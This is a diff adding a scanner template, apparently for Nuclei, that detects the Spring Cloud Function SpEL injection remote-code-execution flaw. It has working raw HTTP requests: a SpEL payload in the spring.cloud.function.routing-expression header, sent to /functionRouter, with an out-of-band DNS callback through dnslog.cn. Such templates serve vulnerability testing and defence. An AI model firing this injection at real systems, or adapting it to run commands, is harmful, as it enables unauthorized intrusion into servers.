@@ -1,0 +1,63 @@
+id: Spring-3
+
+info:
+  name: Spring Cloud Function SpEL RCE漏洞
+  author: attempt
+  severity: high
+  description: |
+    Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。
+    由于Spring CloudFunction中RoutingFunction类的apply方法将请求头中的"spring.cloud.function.routing-expression"参数作为Spel表达式进行处理，造成了Spel表达式注入漏洞，
+    当使用路由功能时，攻击者可利用该漏洞远程执行任意代码。
+  metadata:
+    verified: true
+    max-request: 1
+  tags: Spring,Spring Cloud Function,RCE
+request:
+  - raw:
+      - |
+        GET /getdomain.php HTTP/1.1
+        Host: http://www.dnslog.cn
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+      - |
+        POST /functionRouter HTTP/1.1
+        Host: 192.168.137.138:8080
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        spring.cloud.function.routing-expression: T(java.net.InetAddress).getByName("{{dnslog}}")
+        Content-Type: text/plain
+        Content-Length: 4
+
+        test
+      - |
+        GET /getrecords.php HTTP/1.1
+        Host: http://www.dnslog.cn
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: {{cookie}}
+        Connection: close
+    extractors:
+      - type: kval
+        part: header_0
+        name: cookie
+        kval:
+          - set-cookie
+      - type: regex
+        part: body_0
+        name: dnslog
+        regex:
+          - "^[a-zA-Z0-9-]+\\.dnslog\\.cn$"
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body_2
+        regex:
+          - "[a-zA-Z0-9-]+\\.dnslog\\.cn"
